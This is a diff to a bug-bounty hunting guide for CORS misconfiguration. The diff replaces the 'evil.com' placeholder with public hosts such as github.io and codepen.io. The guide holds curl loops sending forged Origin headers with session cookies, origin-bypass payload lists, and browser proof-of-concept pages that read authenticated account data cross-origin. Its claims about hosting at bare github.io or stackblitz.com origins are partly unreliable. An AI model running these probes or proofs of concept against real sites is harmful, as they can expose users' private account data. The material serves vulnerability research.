@@ -7,6 +7,40 @@ sources: hackerone_public
 
 # HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration
 
+## Attacker Origins — Use These, Not `evil.com`
+
+These four origins are your standard test set. They are:
+- **Hosted on real infrastructure** — some CORS allowlists whitelist known CDN /
+  sandbox domains by domain-suffix match (`*.github.io`, `*.stackblitz.com`).
+  `evil.com` will never match those; these will.
+- **Usable as real PoC hosts** — you can actually serve a PoC HTML page from
+  any of them, making browser-proof screenshots realistic.
+- **Trusted-looking** — helps expose allowlists built from "known safe" lists
+  rather than strict target-origin validation.
+
+```bash
+# Canonical attacker origin set — use ALL FOUR on every endpoint
+CORS_ORIGINS=(
+  "https://github.io"
+  "https://stackblitz.com"
+  "https://codepen.io"
+  "https://jsfiddle.net"
+)
+
+# Also always test null + an obvious fake (catches reflect-any bugs)
+# "null"
+# "https://evil-$(date +%s).com"
+```
+
+> **Why these specific origins?**
+> Many apps build CORS allowlists from popular dev/CDN hosts. A check like
+> `origin.endsWith("github.io")` or `origin.includes("stackblitz")` lets these
+> through while blocking `evil.com`. They surface allowlist-pattern bugs that
+> generic origins miss. They also give you a real URL to host PoC pages on
+> (GitHub Pages, StackBlitz projects, CodePen pens, JSFiddle fiddles).
+
+---
+
 ## What actually pays (and what does not)
 
 CORS pays High **only** when an attacker-controlled origin can perform a
@@ -66,40 +100,60 @@ tokens, CSRF tokens, or other secrets in the body.
 
 ### Phase 1 — Discover CORS endpoints
 ```bash
-# Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
-# and -I sends HEAD which may be handled differently.
-while read url; do
-  result=$(curl -s -D - -o /dev/null "$url" \
-    -H "Origin: https://evil.com" \
-    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
-  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
+# Probe every API endpoint with ALL four attacker origins + null.
+# Use GET (not -I): some servers only emit CORS on GET;
+# HEAD may be handled differently.
+CORS_ORIGINS=(
+  "https://github.io"
+  "https://stackblitz.com"
+  "https://codepen.io"
+  "https://jsfiddle.net"
+  "null"
+)
+
+while read -r url; do
+  for ORIGIN in "${CORS_ORIGINS[@]}"; do
+    result=$(curl -s -D - -o /dev/null "$url" \
+      -H "Origin: $ORIGIN" \
+      -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+    [ -n "$result" ] && echo "=== $url | Origin: $ORIGIN ===" && echo "$result"
+  done
 done < recon/$TARGET/api-endpoints.txt
 
-# httpx bulk check
-cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
-  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
+# httpx bulk check (reflect-any pass — pick one origin; follow up with the full set on hits)
+cat recon/$TARGET/live-hosts.txt | \
+  httpx -H "Origin: https://github.io" -match-string "access-control-allow-origin"
 ```
 
 ### Phase 2 — Reflect-any-origin + null origin
 ```bash
-# Does the server reflect an arbitrary Origin back?
-curl -s -D - -o /dev/null https://$TARGET/api/me \
-  -H "Origin: https://evil.com" \
-  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
+ENDPOINT="https://$TARGET/api/me"   # highest-value endpoint
 
-# Vulnerable (the High case):
-#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
-#   Access-Control-Allow-Credentials: true          <- + credentials => readable
+# Fire ALL four attacker origins + null in one sweep
+for ORIGIN in \
+  "https://github.io" \
+  "https://stackblitz.com" \
+  "https://codepen.io" \
+  "https://jsfiddle.net" \
+  "null"; do
+  echo -n "[$ORIGIN] → "
+  curl -s -D - -o /dev/null "$ENDPOINT" \
+    -H "Origin: $ORIGIN" \
+    -H "Cookie: $SESSION_COOKIE" \
+    | grep -i "access-control" | tr '\r\n' ' '
+  echo
+done
+
+# Interpret results:
+# VULNERABLE (High):
+#   ACAO: https://github.io      ← reflects attacker origin
+#   ACAC: true                   ← + credentials = credentialed read
 #
 # NOT exploitable for credentialed theft:
-#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
-#   (no ACAC, or ACAC absent)                        <- not credentialed
-
-# Null-origin trust
-curl -s -D - -o /dev/null https://$TARGET/api/me \
-  -H "Origin: null" \
-  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
-# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
+#   ACAO: *                      ← browser blocks creds read
+#   (ACAO absent / no ACAC)      ← not credentialed
+#
+# Null-origin trust (ACAO: null + ACAC: true) → sandbox-iframe PoC (Phase 5b)
 ```
 
 ### Phase 3 — Subdomain / trusted-origin regex bypass
@@ -117,14 +171,23 @@ and produces false negatives.
 | Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |
 
 ```bash
-# Send each class-specific payload and watch what the server reflects.
+# Send all class-specific payloads — including the four real attacker origins
+# which expose "known-safe list" style allowlists
 for ORIGIN in \
-  "https://evil.target.com" \
-  "https://eviltarget.com" \
-  "https://x.target.com.evil.com" \
-  "https://target.com.evil.com" \
-  "https://target.com%60.evil.com" \
-  "http://target.com"; do
+  "https://github.io" \
+  "https://stackblitz.com" \
+  "https://codepen.io" \
+  "https://jsfiddle.net" \
+  "null" \
+  "https://evil.$TARGET" \
+  "https://evil${TARGET}" \
+  "https://x.${TARGET}.github.io" \
+  "https://x.${TARGET}.stackblitz.com" \
+  "https://x.${TARGET}.codepen.io" \
+  "https://${TARGET}.github.io" \
+  "https://${TARGET}.stackblitz.com" \
+  "http://$TARGET" \
+  "https://${TARGET}%60.github.io"; do
   RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
     -H "Origin: $ORIGIN" \
     -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
@@ -132,8 +195,10 @@ for ORIGIN in \
 done
 ```
 A bypass is real only if the server reflects **your registerable origin** into
-`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
-you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomain).
+`ACAO` with `ACAC: true`. The four real origins (github.io, stackblitz.com,
+codepen.io, jsfiddle.net) are particularly powerful here: if the allowlist
+was built from a "known safe CDN/sandbox" list, any of these will match while
+`evil.com` would not.
 
 ### Phase 3b — Trusted insecure (HTTP) origin
 If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
@@ -154,12 +219,16 @@ things to test:
    (chain to CSRF-style writes that JSON/SameSite would otherwise block).
 
 ```bash
-curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
-  -H "Origin: https://evil.com" \
-  -H "Access-Control-Request-Method: PUT" \
-  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
-  | grep -i "access-control"
-# Vulnerable: ACAO reflects evil.com + ACAC:true +
+# Test with all four real origins
+for ORIGIN in "https://github.io" "https://stackblitz.com" "https://codepen.io" "https://jsfiddle.net"; do
+  echo "=== OPTIONS from $ORIGIN ==="
+  curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
+    -H "Origin: $ORIGIN" \
+    -H "Access-Control-Request-Method: PUT" \
+    -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
+    | grep -i "access-control"
+done
+# Vulnerable: ACAO reflects your origin + ACAC:true +
 #   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
 # => attacker origin can issue authed PUT/DELETE with custom headers.
 ```
@@ -174,7 +243,15 @@ curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
 curl does NOT enforce CORS — it will happily show you a reflected header even
 when a browser would block the read. **Every CORS High needs a browser PoC.**
 
-**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):
+**Where to host your PoC:**
+- **GitHub Pages**: `https://<youruser>.github.io/<repo>/poc.html` — origin is `https://<youruser>.github.io`
+- **StackBlitz**: create a project, use its preview URL — origin is `https://stackblitz.com` or a project subdomain
+- **CodePen**: paste in the JS panel — origin is `https://codepen.io`
+- **JSFiddle**: paste in the JS panel — origin is `https://jsfiddle.net`
+
+Use whichever of the four origins the server reflected back in Phase 2.
+
+**5a. Reflect-any-origin read** (host on one of the four origins while logged into target):
 ```html
 <!doctype html><body><pre id="out"></pre>
 <script>
@@ -190,11 +267,18 @@ fetch("https://TARGET/api/me", {credentials: "include"})
 If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
 valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).
 
+**Host it:**
+```bash
+# GitHub Pages example (your origin becomes https://<user>.github.io)
+# CodePen / JSFiddle / StackBlitz: paste the script block into the JS panel
+# The Origin header sent by the browser will be one of your four attacker origins
+```
+
 **5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
 document must lack `allow-same-origin` so its origin is opaque (`null`):
 ```html
 <!doctype html><body>
-<!-- Outer page hosted anywhere -->
+<!-- Outer page hosted anywhere — even github.io, codepen.io, etc. -->
 <iframe sandbox="allow-scripts" srcdoc='
   <script>
     fetch("https://TARGET/api/me", {credentials: "include"})
@@ -224,9 +308,9 @@ grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
   | grep -v "\.origin"
 # Then audit each hit: does it check event.origin against an allowlist
 # BEFORE using event.data? Weak checks to flag:
-#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
+#   .indexOf("target.com") > -1      <- "target.com.github.io" or "target.com.codepen.io" passes
 #   .endsWith("target.com")          <- "eviltarget.com" passes
-#   startsWith("https://target")     <- "https://target.evil.com" passes
+#   startsWith("https://target")     <- "https://target.stackblitz.com" passes
 #   no check at all
 ```
 postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
@@ -236,12 +320,17 @@ client-side auth bypass). See hunt-dom for exploitation depth.
 
 ## Automation (triage only — never the proof)
 ```bash
-# corsy — fast reflection/null/pre-domain checks
+# corsy — fast reflection/null/pre-domain checks — run with ALL four real origins
 pip3 install corsy
-corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"
+for ORIGIN in "https://github.io" "https://stackblitz.com" "https://codepen.io" "https://jsfiddle.net" null; do
+  echo "=== corsy: Origin: $ORIGIN ==="
+  corsy -u "https://$TARGET" -t 10 \
+    --headers "Cookie: $SESSION_COOKIE" \
+    2>/dev/null | grep -i "cors\|origin\|vulnerable" || true
+done
 
 # nuclei CORS templates
-nuclei -u https://$TARGET -t http/misconfiguration/cors/
+nuclei -u "https://$TARGET" -t http/misconfiguration/cors/
 
 # Burp: passively flags origin reflection; always re-confirm in a real browser.
 ```
@@ -265,15 +354,16 @@ Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
 ## Validation discipline (read before submitting)
 
 - **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
-  Show a screenshot/console log of the authed body read from `evil.com`. If the
-  fetch throws / logs `BLOCKED`, you have nothing.
+  Host the PoC on one of the four attacker origins (GitHub Pages, StackBlitz,
+  CodePen, JSFiddle) and show a screenshot/console log of the authed body read
+  from that origin. If the fetch throws / logs `BLOCKED`, you have nothing.
 - **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
   wildcard if the data is sensitive unauthenticated (then it is usually Low).
 - **`ACAC: true` alone proves nothing** — it must pair with your reflected
   origin AND a successful readable cross-origin body.
 - **Match the regex class to the payload (Phase 3).** Do not submit
-  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
-  match and is not a bug.
+  `target.com.github.io` against an end-anchored escaped-dot regex — it does
+  not match and is not a bug.
 - **`evil.target.com` reflecting is not automatically a bug** — it is an
   in-scope subdomain by design unless you can actually control it.
 - **OOB confirmation** for blind/headless contexts: exfil the read body to a
